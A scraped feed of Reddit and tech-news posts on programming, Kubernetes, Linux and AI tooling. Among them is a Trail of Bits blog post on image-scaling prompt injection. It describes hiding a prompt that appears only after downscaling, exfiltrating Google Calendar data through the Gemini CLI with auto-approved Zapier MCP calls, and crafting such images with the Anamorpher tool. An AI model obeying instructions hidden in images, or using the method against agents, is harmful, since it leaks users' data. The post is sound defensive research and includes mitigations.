models?","url":"https://www.reddit.com/r/MachineLearning/comments/1mxodik/d_where_are_the_ai_startups_working_with/","date":1755912175,"author":"/u/prisencotech","guid":237162,"unread":true,"content":"<div><p>Diffusion models are showing a rate of growth we were promised with LLMs but there's not much hype (could be a good thing).</p><p>Where's the cutting edge for diffusion happening?</p></div>   submitted by   <a href=\"https://www.reddit.com/user/prisencotech\"> /u/prisencotech </a>","contentLength":207,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Codanna now supports Go! Instant call graphs, code-aware lookup, zero servers","url":"https://www.reddit.com/r/golang/comments/1mxnw4v/codanna_now_supports_go_instant_call_graphs/","date":1755910799,"author":"/u/Plenty_Seesaw8878","guid":237224,"unread":true,"content":"<p>Your coding assistants can now index and navigate Go, Python, Typescript or Rust projects with precise context in . Runs fully local, integrates anywhere—from vibe coding with agents to plain Unix piping. It get's line numbers, extracts method signatures and logical flows in . Bonus: two Claude slash commands for everyday workflows —  for natural-language lookup and  for dependency analysis</p><p>Codanna is the Unix tool that builds a live atlas of your code. Alone, it answers queries in under 300 ms. With agents or pipes, it drives context-aware coding with <strong>speed, privacy, and no guesswork</strong>.</p>","contentLength":595,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Netbeans 27 Released","url":"https://lists.apache.org/thread/py28oztx51vhk4f1js3q54vpx8pwzbb3","date":1755908352,"author":"/u/BlueGoliath","guid":237182,"unread":true,"content":"<!DOCTYPE html>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mxn10t/netbeans_27_released/"},{"title":"FTP faster upload","url":"https://www.reddit.com/r/golang/comments/1mxjcfr/ftp_faster_upload/","date":1755898910,"author":"/u/pepiks","guid":237223,"unread":true,"content":"<p>Is possible using Go upload files faster than by FTP client? I am looking for speed up uploading gallery images - typical size is around 20-40 MB at maximum, up to 200 resized images, but transfer is very slow and it can take even 15 minutes for this size. I am using FTP for this, not FTPS.</p>","contentLength":291,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"I'm making a freeware Linux Learning Game and could use some QA, Criticism, and feedback.","url":"https://www.reddit.com/r/linux/comments/1mxgm8l/im_making_a_freeware_linux_learning_game_and/","date":1755892448,"author":"/u/nconsola","guid":237110,"unread":true,"content":"<p>I hope I can post here, I read the rules and I’m not trying to self-promoter, as I’m going to release this Linux learning game for free and make it open source when complete.</p><p>I am making a simple text-based game that is 100% focused on learning Linux command line, this game is not focused on specific distros of Linux like Ubuntu or Debian, it is Basic Standard Linux. If people like the game I will make others that are continuations off of this, that are specific to distros but for now its base Linux.</p><p>Quick background, I DO NOT KNOW LINUX, but we use it at work (Debian) and I need to learn it. This is why I made this game, every time I try to learn the commands ill forget them or say screw it, I will use the GUI. So, I thought if I had a game that focused on teaching me Linux, I could do it.... yeah, I know probably not going to happen, but still I set off to make it, and with the help of Google Gemini I have a solid Beta of the game, maybe Alpha/Beta, maybe Alpha. There is a lot I want to add after the instruction part of the game which is all I have now, so it is not complete just the 3 chapters that are below.</p><p>Through QA'ing the game myself I have learned a ton about command line. But as anyone who has QA a game before, you eventually know what to put in to get to the next part, and this doesn’t give a good representation of whether or not the game is teaching well for people who just pick it up. So, I’m looking for any testers who know Linux, and anyone who doesn’t.</p><p>I want people who know Linux, this way I can make sure all the commands work as they should, basically \"look\" the way they should in the simulated terminal, and to make sure I have all the commands that are available for basic Linux, and provide feedback where needed.</p><p>I want people who don’t know Linux, this way I can get feedback on the way the game progresses, does it make sense, do you actually feel like you’re learning Linux while playing, is it confusing, what do you not like, etc.</p><p>A little bit on what I have implemented so far,</p><p>some simple non game elements are,</p><ol><li><p>Terminal themes, so I have Default theme (supposed to simulate the terminal from the movie Alien, its close but not 100%), Commodore 64, Dos, Linux, and Apple II+ (which was my first computer)</p></li><li><p>A voice over on/off switch for the simulated AI, Aurora, it’s not a real AI or even a LLM it’s just simulated, all the commands and responses I have put in, and it is basic right now. But as the user you are being helped by a ship AI which is basically teaching you the Linux commands. And yeah, it was the closest voice I could get to simulate Mother in the movie Alien, and it sounds nothing like Mother.</p></li></ol><p>There is a beginner, intermediate, and advanced sections of the game, that teach you the following commands. Someone who knows Linux really good please let me know if you think anything is missing, but remember this is basic Linux so there is no apt-get etc. like in Debian, at least as far as I know.</p><p>* `help` - Shows available commands.</p><p>* `pwd` - Prints the current working directory.</p><p>* `ls` - Lists files and directories.</p><p>* `~` - A shortcut for the user's home directory.</p><p>* `clear` - Clears the terminal screen.</p><p>* `cat` - Displays the contents of a file.</p><p>* `hint` - Provides a hint for the current objective.</p><p>* `man` - Shows the manual page for a command.</p><p>* `cd` - Changes the current directory.</p><p>* `uptime` - Shows how long the system has been running.</p><p>* `echo` - Displays text or writes it to a file.</p><p>* `mkdir` - Creates a new directory.</p><p>* `touch` - Creates a new, empty file.</p><p>* `&gt;` - A redirection operator to write output to a file.</p><p>* `rm` - Removes (deletes) files.</p><p>* `rmdir` - Removes (deletes) empty directories.</p><p>* `mv` - Moves or renames files and directories.</p><p>* `less` - Views the content of a file page by page.</p><p>* `grep` - Searches for patterns within files.</p><p>* `find` - Searches for files and directories.</p><p>* `head` - Displays the beginning of a file.</p><p>* `tail` - Displays the end of a file.</p><p>* `wc` - Counts lines, words, and characters in a file.</p><p>* `sort` - Sorts the lines of a file.</p><p>* `|` - The \"pipe\" operator, used to send the output of one command to another.</p><p>* `uniq` - Removes duplicate adjacent lines from a file.</p><p>* `diff` - Compares two files and shows their differences.</p><p>* `ln` - Creates links between files.</p><p>* `uname` - Shows system information.</p><p>* `whoami` - Shows the current user's username.</p><p>* `groups` - Shows the groups a user belongs to.</p><p>* `dmesg` - Shows kernel and driver messages.</p><p>* `free` - Displays memory usage.</p><p>* `df` - Displays disk space usage.</p><p>* `du` - Shows the disk usage of files and directories.</p><p>* `tree` - Displays a directory's contents in a tree-like format.</p><p>* `file` - Determines a file's type.</p><p>* `cmp` - Compares two files byte by byte.</p><p>* `cut` - Extracts sections from lines of a file.</p><p>* `tr` - Translates or deletes characters.</p><p>* `&lt;` - A redirection operator to use a file's content as input.</p><p>* `tee` - Reads from standard input and writes to both standard output and files.</p><p>* `locate` - Finds files by name quickly.</p><p>* `chmod` - Changes the permissions of a file or directory.</p><p>* `sudo` - Executes a command as the superuser (root).</p><p>* `chown` - Changes the owner of a file or directory.</p><p>* `umask` - Sets the default permissions for new files.</p><p>* `split` - Splits a file into smaller pieces.</p><p>* `paste` - Merges the lines of files.</p><p>* `join` - Joins the lines of two files on a common field.</p><p>* `tar` - Creates and extracts archive files.</p><p>* `gzip` - Compresses or decompresses files.</p><p>* `gunzip` - Decompresses `.gz` files.</p><p>* `zip` - Creates a `.zip` archive.</p><p>* `unzip` - Extracts files from a `.zip` archive.</p><p>* `sed` - A stream editor for filtering and transforming text.</p><p>* `awk` - A powerful pattern scanning and processing language.</p><p>* `ping` - Tests network connectivity to a host.</p><p>* `traceroute` - Traces the network path to a host.</p><p>* `curl` - Transfers data from or to a server.</p><p>* `ps` - Shows currently running processes.</p><p>* `top` - Displays a dynamic, real-time view of processes.</p><p>* `htop` - An interactive process viewer.</p><p>* `netstat` - Shows network connections and statistics.</p><p>* `kill` - Sends a signal to a process (e.g., to terminate it) by its ID.</p><p>* `pkill` - Sends a signal to a process by its name.</p><p>* `iostat` - Reports CPU and I/O statistics.</p><p>* `vmstat` - Reports virtual memory statistics.</p><p>* `sar` - Collects and reports system activity information.</p><p>* `passwd` - Changes a user's password.</p><p>* `groupadd` - Creates a new user group.</p><p>* `useradd` - Creates a new user account.</p><p>* `usermod` - Modifies an existing user account.</p><p>* `userdel` - Deletes a user account.</p><p>* `groupdel` - Deletes a user group.</p><p>* `systemctl` - Manages system services.</p><p>* `bg` - Sends a job to the background.</p><p>* `fg` - Brings a job to the foreground.</p><p>* `jobs` - Lists active jobs.</p><p>* `mount` - Mounts a filesystem.</p><p>* `umount` - Unmounts a filesystem.</p><p>* `rsync` - Synchronizes files and directories between locations.</p><p>* `dd` - Copies and converts files at a low level.</p><p>* `lsof` - Lists open files.</p><p>* `crontab` - Manages scheduled tasks (cron jobs).</p><p>I’ve been working on the game for almost 4 months, and rewritten this game from scratch 3 times now, which sucks, but when I seem to make major changes I break things, and as I’m not a good programmer, I rely on AI (Google Gemini), and as anyone who has used any AI programmer you know sometimes it decides to just DESTROY EVERYTHING YOU HAVE CREATED BEYOND REPAIR! So, when you go through the Beginner section you will notice that all the commands you need to run are explained by the ship AI and it is 99% complete as far as I can tell. The intermediate and advanced sections so far have everything working, as in the commands to move on to the next section, but you need to talk to the ship AI for every new command you need to enter to complete the task. So, it works functionally as far as I last tested, but you need to ask Aurora what to do next all the time, which is a pain in the ass. But That will be fixed as soon as I know everything else in the Beginner section is working, as I don’t want to update everything to just have to redo it if I messed something up in the beginner part.</p><p>Once the 3 parts are complete, I can then work on the, story part, which as of my planning will have 3 endings depending on how the player uses the Linux commands, and what they do in the game. The story part will be used as repetition on the commands from the previous 3 parts, this way it will hopefully burn the Linux commands into our heads, and we become Linux gods.</p><p>So, what’s the premise of the game. You are a sole caretaker (except for the ship AI, Aurora) of a spaceship on a deep space mission. Something happened on the ship and the AI sent you to the Engineering Bay and converted all life support to that area before shutting down to conserver power as the power is draining as well. The ship is run on a Linux system, and you need to get it back up and running before the Life support and Power go to 0% and you die. But you don’t know Linux, so the localized version of the ship AI, Aurora, is there to talk you through how to fix the ship and bring the systems back up using just Linux commands from the one terminal that is working. once you get everything back up and running stably, then you need to go through and see what happened. From this point on is the story part of the game and will involve going into the ships servers to find out what happened and what else needs to be fixed, etc.</p><p>The game is all web browser bases so far, when done I’ll be able to port it to windows, Linux, mobile, at least that is what Google Gemini told me. So, I can put all the files in a Zip, or upload to my google drive, or can I upload here? I don’t want to upload here yet unless I get permission, as I believe it was one of the rules, unless I read it wrong.</p>","contentLength":9738,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Quick dumb question: Why did google not use Go for the gemini cli?","url":"https://www.reddit.com/r/golang/comments/1mxgdg1/quick_dumb_question_why_did_google_not_use_go_for/","date":1755891882,"author":"/u/0b_1000101","guid":237078,"unread":true,"content":"<p>I was just trying the Gemini CLI, and when I checked the repo, I saw it was written in TypeScript. I do have a preference for Go, but I just want an objective reason for choosing TypeScript. I haven't really developed complex CLI tools in Go, just a few basic ones, but I know it is possible to create a good-looking TUI using bubble tea or something else.</p><p>I would like to know what advantages Go provides over other languages in terms of CLI from a user perspective.</p>","contentLength":466,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Kubernetes v1.34 is coming with some interesting security changes — what do you think will have the biggest impact?","url":"https://www.armosec.io/blog/kubernetes-1-34-security-enhancements/","date":1755890863,"author":"/u/Swimming_Version_605","guid":237071,"unread":true,"content":"<p>Kubernetes v1.34 is coming soon, and it brings a rich batch of security upgrades – from alpha features that hint at the future of zero-trust Kubernetes, to mature enhancements making their way into stable releases. Whether you’re managing a production cluster or exploring new security patterns, this release has something worth your attention.</p><div><div><h2>Kubernetes Security – The Ultimate Guide</h2><div><p>Dive deep into the ever evolving landscape of Kubernetes security, explore best practices, and discover potential pitfalls.</p></div><a href=\"https://landing.armosec.io/kubernetes_security_best_practices\">Learn More</a></div></div><h2>🔐 What’s New in Kubernetes 1.34 Security</h2><h3>Built‑in Mutual TLS for Pods (Alpha)&nbsp;</h3><p>Pods can now request short-lived X.509 certificates from the Kubernetes API server and use them to authenticate via mutual TLS. This enables a clean and native approach to in-cluster workload identity without relying on external tools or sidecars.</p><h3>Fine‑Grained Anonymous API Endpoint Control (Stable)&nbsp;</h3><p>Rather than disabling anonymous access cluster-wide, you can now configure it to apply only to specific safe paths (like /healthz, /livez, and /readyz). This prevents overly permissive anonymous access while preserving functionality for monitoring and load balancers.</p><h3><a href=\"https://www.armosec.io/blog/a-guide-for-using-kubernetes-rbac/\" target=\"_blank\" rel=\"noreferrer noopener\">RBAC</a> with Field &amp; Label Selectors for List/Delete (Stable)&nbsp;</h3><p>You can now restrict access to resources based on selectors in list, watch, and deleteCollection operations. For example, limit a kubelet to view only the pods on its node using spec.nodeName=$NODE.</p><h3>External JWT Signing via KMS or HSM (Beta)&nbsp;</h3><p>ServiceAccount tokens can now be signed using an external KMS or HSM via a new gRPC interface. This improves key security by enabling rotation, offloading signing from the API server, and aligning with compliance needs.</p><h3>Short-Lived Pod-Scoped Tokens for ImagePull (Beta)&nbsp;</h3><p>No more long-lived imagePullSecrets. Kubernetes can now use short-lived, per-pod tokens automatically generated for accessing private registries. These tokens are OIDC-compliant and auto-rotated by the system.</p><h3>CEL-Based In-Process Mutating Admission Policies (Beta)&nbsp;</h3><p>Kubernetes now supports <a href=\"https://www.armosec.io/blog/kubernetes-admission-controller/\" target=\"_blank\" rel=\"noreferrer noopener\">mutating admission policies</a> written using CEL (Common Expression Language) directly in the API server—no external webhook required. This simplifies setup and improves performance while supporting re-evaluation logic.</p><p>ARMO’s Kubescape, the CNCF’s Incubating open-source Kubernetes security platform, will enhance its<a href=\"https://github.com/kubescape/cel-admission-library/\" target=\"_blank\" rel=\"noreferrer noopener nofollow\"> CEL admission control library</a> in the upcoming release to support these new in-process mutating policies. This will allow users to define and enforce mutating admission policies directly within Kubescape, leveraging the same CEL framework as Kubernetes itself.</p><h3>OCI Artifact Volumes (Beta)&nbsp;</h3><p>You can now mount artifacts stored in OCI registries directly into pods as read-only volumes. This is useful for securely distributing config files, binaries, or ML models without baking them into container images.</p><h3>🧠 Why These Changes Matter</h3><figure><table><thead><tr></tr></thead><tbody><tr><td>Enables pod-to-API secure identity</td><td>Test alpha feature in dev clusters</td></tr><tr><td>Prevents overexposed unauthenticated access</td></tr><tr><td>Enforces least privilege at node/pod granularity</td><td>Update roles with selectors</td></tr><tr><td>Eliminates local key exposure</td><td>Integrate with existing KMS</td></tr><tr><td>Prevents static secret leakage</td><td>Migrate from imagePullSecrets</td></tr><tr><td>Simplifies secure mutation logic</td><td>Define CEL-based policies</td></tr><tr><td>Secure delivery of external files</td><td>Replace sidecar/manual content injection</td></tr></tbody></table></figure><p>The Kubernetes 1.34 release reflects a growing focus on , , and <strong>native, reliable policy enforcement</strong>. From in-cluster identities to hardened token workflows and registry access, these updates make it easier for platform teams to deliver secure infrastructure – without reinventing the wheel.</p><p>Stay secure, stay curious.</p><p>— <a href=\"https://www.armosec.io\" target=\"_blank\" rel=\"noreferrer noopener\"></a><a href=\"https://github.com/kubescape/kubescape\" target=\"_blank\" rel=\"noreferrer noopener\"></a><em>, the open-source Kubernetes security platform</em> and one of the leading <a href=\"https://www.armosec.io/platform/kubernetes-security-posture-management/\">KSPM</a> solutions. </p><div><div><h2>Quickly ensure your Kubernetes is secured.</h2><div><p>Follow this simple checklist and make sure your Kubernetes security is covered in just a few steps.</p></div><a href=\"https://landing.armosec.io/kubernetes_checklist\">Read Now</a></div></div>","contentLength":3881,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/kubernetes/comments/1mxfxsq/kubernetes_v134_is_coming_with_some_interesting/"},{"title":"[Media] Accelerating Erasure Coding to 50GB/s with Rust 1.89.0 and AVX-512 on AMD EPYC","url":"https://www.reddit.com/r/rust/comments/1mxe8t4/media_accelerating_erasure_coding_to_50gbs_with/","date":1755886981,"author":"/u/itzmeanjan","guid":237149,"unread":true,"content":"<div><p>Thanks to Rust 1.89.0 stabilizing both  and  target features, now we have faster erasure-coding and recoding with Random Linear Network Coding, on x86_64.</p><p>Here's a side-by-side comparison of the peak median throughput between </p><ul><li>x86_64 with  (12th Gen Intel(R) Core(TM) i7-1260P)</li><li>x86_64 with  (AWS EC2  with Intel(R) Xeon(R) Platinum 8488C)</li><li>x86_64 with  (AWS EC2  with AMD EPYC 9R14)</li><li>aarch64 with  (AWS EC2  with Graviton4 CPU)</li></ul><table><thead><tr></tr></thead><tbody><tr></tr><tr></tr><tr></tr></tbody></table></div>   submitted by   <a href=\"https://www.reddit.com/user/itzmeanjan\"> /u/itzmeanjan </a>","contentLength":453,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Weaponizing image scaling against production AI systems - AI prompt injection via images","url":"https://blog.trailofbits.com/2025/08/21/weaponizing-image-scaling-against-production-ai-systems/","date":1755885633,"author":"/u/grauenwolf","guid":237074,"unread":true,"content":"<p>Picture this: you send a seemingly harmless image to an LLM and suddenly it exfiltrates all of your user data. By delivering a multi-modal prompt injection not visible to the user, we achieved data exfiltration on systems including the Google Gemini CLI. This attack works because AI systems often scale down large images before sending them to the model: when scaled, these images can reveal prompt injections that are not visible at full resolution.</p><p>In this blog post, we’ll detail how attackers can <a href=\"https://www.usenix.org/conference/usenixsecurity20/presentation/quiring\">exploit image scaling</a> on Gemini CLI, Vertex AI Studio, Gemini’s web and API interfaces, Google Assistant, Genspark, and other production AI systems. We’ll also explain how to mitigate and defend against these attacks, and we’ll introduce <a href=\"https://github.com/trailofbits/anamorpher\">Anamorpher</a>, our open-source tool that lets you explore and generate these crafted images.</p><p>: <a href=\"https://www.usenix.org/conference/usenixsecurity19/presentation/xiao\">Image scaling attacks</a> were used for model <a href=\"https://arxiv.org/abs/2003.08633\">backdoors, evasion, and poisoning</a> primarily against older computer vision systems that enforced a fixed image size. While this constraint is less common with newer approaches, the systems surrounding the model may still impose constraints calling for image scaling. This establishes an underexposed, yet widespread vulnerability that we’ve weaponized for <a href=\"https://developer.nvidia.com/blog/how-hackers-exploit-ais-problem-solving-instincts/\">multi-modal prompt injection</a>.</p><h2>Data exfiltration on the Gemini CLI</h2><p>To set up our data exfiltration exploit on the Gemini CLI through an image-scaling attack, we applied the default configuration for the Zapier MCP server. This automatically approves all MCP tool calls without user confirmation, <a href=\"https://github.com/google-gemini/gemini-cli/issues/5598\">as it sets  in the  of the Gemini CLI</a>. This provides an important primitive for the attacker.</p><p>Figure 2 showcases a video of the attack. First, the user uploads a seemingly benign image to the CLI. With no preview available, the user cannot see the transformed, malicious image processed by the model. This image and its prompt-ergeist triggers actions from Zapier that exfiltrates user data stored in Google Calendar to an attacker’s email without confirmation.</p><p>We also successfully demonstrated image scaling attacks on the following:</p><ul><li>Vertex AI with a Gemini back end</li><li>Gemini’s API via the  CLI</li><li>Google Assistant on an Android phone</li></ul><p>Notice the persistent mismatch between user perception and model inputs in figures 3 and 4. The exploit is particularly impactful on Vertex AI Studio because the front-end UI shows the high-resolution image instead of the downscaled image perceived by the model.</p><p>Our testing confirmed that this attack vector is widespread, extending far beyond the applications and systems documented here.</p><h2>Sharpening the attack surface</h2><p>These image scaling attacks exploit downscaling algorithms (or <a href=\"https://guide.encode.moe/encoding/resampling.html\">image resampling algorithms</a>), which perform interpolation to turn multiple high resolution pixel values into a single low resolution pixel value.</p><p>There are three major downscaling algorithms: <a href=\"https://en.wikipedia.org/wiki/Nearest-neighbor_interpolation\">nearest neighbor interpolation</a>, <a href=\"https://en.wikipedia.org/wiki/Bilinear_interpolation\">bilinear interpolation</a>, and <a href=\"https://en.wikipedia.org/wiki/Bicubic_interpolation\">bicubic interpolation</a>. Each algorithm requires a different approach to perform an image scaling attack. Furthermore, these algorithms are implemented differently across libraries (e.g., Pillow, PyTorch, OpenCV, TensorFlow), with varying anti-aliasing, alignment, and kernel phases (in addition to <a href=\"https://bartwronski.com/2021/02/15/bilinear-down-upsampling-pixel-grids-and-that-half-pixel-offset/\">distinct bugs</a> that historically have <a href=\"https://arxiv.org/abs/2104.11222\">plagued model performance</a>). These differences also impact the techniques necessary for an image scaling attack. Therefore, exploiting production systems required us to fingerprint each system’s algorithm and implementation.</p><p>To understand why image downscaling attacks are possible, imagine that you have a long ribbon with an intricate yet regular pattern on it. As this ribbon is pulled past you, you’re trying to recreate the pattern by grabbing samples of the ribbon at regular intervals. If the pattern changes rapidly, you need to grab samples very frequently to capture all the details. If you’re too slow, you’ll miss crucial parts between grabs, and when you try to reconstruct the pattern from your samples, it looks completely different from the original.</p><h2>Anamorpher and the attacker’s darkroom</h2><p>Currently, Anamorpher (named after <a href=\"https://en.wikipedia.org/wiki/Anamorphosis\">anamorphosis</a>) can develop crafted images for the aforementioned three major methods. Let’s explore how Anamorpher exploits bicubic interpolation frame by frame.</p><p>Bicubic interpolation considers the 16 pixels (from 4x4 sampling) around each target pixel, using cubic polynomials to calculate smooth transitions between pixel values. This method creates a predictable mathematical relationship that can be exploited. Specifically, the algorithm assigns different weights to pixels in the neighborhood, creating pixels that contribute more to the final output, which are known as high-importance pixels. Therefore, the total <a href=\"https://en.wikipedia.org/wiki/Luma_(video)\">luma</a> (brightness) of dark areas of an image will increase if specific high-importance pixels are higher luma than their surroundings.</p><p>Therefore, to exploit this, we can carefully craft high-resolution pixels and solve the inverse problem. First, we select a decoy image with large dark areas to hide our payload. Then, we adjust pixels in dark regions and push the downsampled result toward a red background using least-squares optimization. These adjustments in the dark areas cause the background to turn red while text areas remain largely unmodified and appear black, creating much stronger contrast than visible at full resolution. While this approach is most effective on bicubic downscaling, it also works on specific implementations of bilinear downscaling.</p><p>Anamorpher provides users with the ability to visualize and craft image scaling attacks against specific algorithms and implementations through a front-end interface and Python API. In addition, it comes with a modular back end, which enables users to customize their own downscaling algorithm.</p><p>While some downscaling algorithms are more vulnerable than others, attempting to identify the least vulnerable algorithm and implementation is <a href=\"https://arxiv.org/abs/2104.08690\">not a robust approach</a>. This is especially true since image scaling attacks are not restricted to the aforementioned three algorithms.</p><p>For a secure system, we recommend not using image downscaling and simply limiting the upload dimensions. For any transformation, but especially if downscaling is necessary, the end user should always be provided with a preview of the input that the model is actually seeing, even in CLI and API tools.</p><p><a href=\"https://github.com/trailofbits/anamorpher\">Anamorpher</a> is currently in beta, so feel free to reach out with feedback and suggestions as we continue to improve this tool. Stay tuned for more work on the security of multi-modal, agentic, and multi-agentic AI systems!</p>","contentLength":6551,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mxdmty/weaponizing_image_scaling_against_production_ai/"},{"title":"XSLT removal will break multiple government and regulatory sites across the world","url":"https://github.com/whatwg/html/issues/11582","date":1755885585,"author":"/u/Comfortable-Site8626","guid":237075,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mxdm22/xslt_removal_will_break_multiple_government_and/"},{"title":"OpenBao installation on Kubernetes - with TLS and more!","url":"https://nanibot.net/posts/vault","date":1755885253,"author":"/u/-NaniBot-","guid":237020,"unread":true,"content":"<div><p>OpenBao is an open-source fork of HashiCorp’s Vault, created to ensure the project remains community-driven and permissively licensed. It provides a robust, transparent, and accessible solution for secrets management and data protection, offering a viable alternative for users who relied on Vault’s original open-source model.</p><p>The default Helm installation of OpenBao is enough for a dev environment but it needs some modifications for a full-fledged production deployment. In this blog post we’ll learn about how a typical production deployment for OpenBao would look like.</p><p> I’m  new to OpenBao myself. Apologies for any mistakes/inaccuracies in my blog post. Feel free to e-mail me if you find something wrong.</p><p><code>mail: nanibot@nanibot.net</code></p><p>Here’s all the things that we’re going to configure for our OpenBao cluster:</p><ol><li><p>End-to-end TLS encryption for network traffic. Includes the OpenBao UI (with proxy SSL support!)</p></li><li><p>High availability via OpenBao’s internal Raft implementation.</p></li><li><p>Auto-unseal without relying on a cloud KMS solution ( This might  be secure - depending on whether you feel comfortable storing the unseal key as a kubernetes secret or not)</p></li></ol><p> Currently, static unseal is only available in a nightly build (<code>openbao/openbao-nightly:2.4.0-nightly1752150785</code>) but is planned to be released as part of the 2.4.0 release</p><ul><li><p>I’ll use  for creating the necessary certificates and  for exposing the UI</p></li><li><p>I’ll assume the chart is going to be installed in the  namespace and the release is called </p></li></ul><ol><li>Certificate to be used for TLS. In this example, I’m using a wildcard certificate issued by my own CA. The certificate is stored in a kubernetes secret named <code>internal-wildcard-cert-secret</code> in the  namespace</li></ol><pre tabindex=\"0\"><code>apiVersion: cert-manager.io/v1\nkind: Certificate\nmetadata:\n  name: internal-wildcard-cert\n  namespace: vault-system\nspec:\n  secretName: internal-wildcard-cert-secret\n  duration: 2160h\n  renewBefore: 720h\n  privateKey:\n    algorithm: RSA\n    encoding: PKCS1\n    size: 2048\n    rotationPolicy: Always\n  subject:\n    organizations:\n      - Umbrella\n    organizationalUnits:\n      - nanibot.net\n  dnsNames:\n    - \"vault-production-openbao-active\"\n    - \"*.vault-production-openbao-internal\"\n    - \"*.vault-production-openbao-internal.vault-system\"\n    - \"*.vault-production-openbao-internal.vault-system.svc\"\n    - \"*.vault-production-openbao-internal.vault-system.svc.cluster.local\"\n  ipAddresses:\n    - \"127.0.0.1\"\n  issuerRef:\n    name: pki-production-selfsigned-issuer\n    kind: ClusterIssuer\n</code></pre><p> The dnsName entry <code>vault-production-openbao-active</code> refers to the Kubernetes service that’s created by the Helm chart. This will also be our API Address - the hostname that the Vault API will be exposed at.</p><ol start=\"2\"><li>Unseal key for static auto-unseal</li></ol><p>We need to create a kubernetes secret containing the unseal key for static auto-unseal to work. We can do this by running the following commands:</p><pre tabindex=\"0\"><code>openssl rand -out unseal-umbrella-1.key 32\nkubectl create secret generic unseal-key --from-file=unseal-umbrella-1.key=./unseal-umbrella-1.key\n</code></pre><pre tabindex=\"0\"><code>global:\n  tlsDisable: false\nserver:\n  image:\n    repository: \"openbao/openbao-nightly\"\n    tag: \"2.4.0-nightly1752150785\"\n  extraEnvironmentVars:\n    BAO_CACERT: \"/certs/ca.crt\"\n  ha:\n    enabled: true\n    apiAddr: \"https://vault-production-openbao-active:8200\"\n    raft:\n      enabled: true\n      config: |\n        ui = true\n\n        listener \"tcp\" {\n          address = \"[::]:8200\"\n          cluster_address = \"[::]:8201\"\n          tls_cert_file = \"/certs/tls.crt\"\n          tls_key_file = \"/certs/tls.key\"\n        }\n\n        storage \"raft\" {\n          path = \"/openbao/data\"\n        }\n\n        seal \"static\" {\n          current_key_id = \"umbrella-1\"\n          current_key = \"file:///keys/unseal-umbrella-1.key\"\n        }\n\n        service_registration \"kubernetes\" {}\n  auditStorage:\n    enabled: true\n  ingress:\n    enabled: true\n    annotations:\n      nginx.ingress.kubernetes.io/backend-protocol: \"HTTPS\"\n      nginx.ingress.kubernetes.io/proxy-ssl-verify: \"on\"\n      nginx.ingress.kubernetes.io/proxy-ssl-name: \"vault-production-openbao-active\"\n      nginx.ingress.kubernetes.io/proxy-ssl-secret: \"vault-system/internal-wildcard-cert-secret\"\n    ingressClassName: \"nginx\"\n    hosts:\n      - host: vault.nanibot.net\n    tls:\n      - secretName: public-wildcard-cert-secret\n        hosts:\n          - vault.nanibot.net\n  volumes:\n    - name: unseal-key\n      secret:\n        secretName: unseal-key\n    - name: certs\n      secret:\n        secretName: internal-wildcard-cert-secret\n  volumeMounts:\n    - mountPath: /keys\n      name: unseal-key\n      readOnly: true\n    - mountPath: /certs\n      name: certs\n      readOnly: true\nui:\n  enabled: true\n</code></pre><ol><li><p>We enable TLS by setting  to . This enables https endpoints for the relevant services.</p></li><li><p>We use the nightly build of OpenBao which has support for static auto-unseal (<code>openbao/openbao-nightly:2.4.0-nightly1752150785</code>).</p></li><li><p> is set to the path of our CA certificate so that OpenBao can verify the TLS certificate of other nodes in the cluster.</p></li><li><p>We enable HA and Raft storage.</p></li><li><p>We configure the Raft listener to use TLS and bind to all interfaces. We also provide the paths to our TLS certificate and key.</p></li><li><p>We configure static auto-unseal using a file-based unseal key.</p></li><li><p>apiAddr is set to the DNS name of the active OpenBao node (Kubernetes service created by the Helm chart). This is required for the UI to work properly with proxy SSL.</p></li><li><p>proxy-ssl-name is set to the DNS name of the active OpenBao node. This is required for the UI to work properly with proxy SSL.</p></li><li><p>Other  parameters are set to ensure that the ingress controller can verify the TLS certificate of the OpenBao server.</p></li><li><p>We enable the UI by setting  to .</p></li><li><p>Volumes and volume mounts are added for the unseal key and TLS certificates.</p></li></ol><ol><li><p>Install the helm chart using the above values.yaml file</p></li><li><p>Initialize the OpenBao cluster by running the following command (Assuming the pod name is <code>vault-production-openbao-0</code>):</p></li></ol><pre tabindex=\"0\"><code>kubectl exec -it vault-production-openbao-0 -- bao operator init\n</code></pre><ol start=\"3\"><li><p>Store the unseal key(s) and the root token somewhere safe</p></li><li><p>Join the other nodes to the cluster by running the following command on each of them:</p></li></ol><pre tabindex=\"0\"><code>kubectl exec -it vault-production-openbao-1 -- bao operator raft join -leader-ca-cert=@/certs/ca.crt https://vault-production-openbao-0.vault-production-openbao-internal:8200\nkubectl exec -it vault-production-openbao-2 -- bao operator raft join -leader-ca-cert=@/certs/ca.crt https://vault-production-openbao-0.vault-production-openbao-internal:8200\n</code></pre><p>That’s it! You should now have a fully functional OpenBao cluster running on Kubernetes with TLS, HA and auto-unseal support.</p><p>The Web UI should be accessible at <code>https://vault.nanibot.net</code> (or whatever host you configured in the ingress).</p></div>","contentLength":6709,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/kubernetes/comments/1mxdgvd/openbao_installation_on_kubernetes_with_tls_and/"},{"title":"Anybody using multi-seat? This is my Ubuntu 24.04 multi-seat setup for my kids.","url":"https://www.reddit.com/r/linux/comments/1mxcodi/anybody_using_multiseat_this_is_my_ubuntu_2404/","date":1755883456,"author":"/u/Rob_Bob_you_choose","guid":237024,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Quick background and Demo on kagent - Cloud Native Agentic AI - with Christian Posta and Mike Petersen","url":"https://youtube.com/live/KUOIRZsWv38","date":1755882405,"author":"/u/mpetersen_loft-sh","guid":237021,"unread":true,"content":"<div><p>Christian Posta gives some background on kagent, what they looked into when building agents on 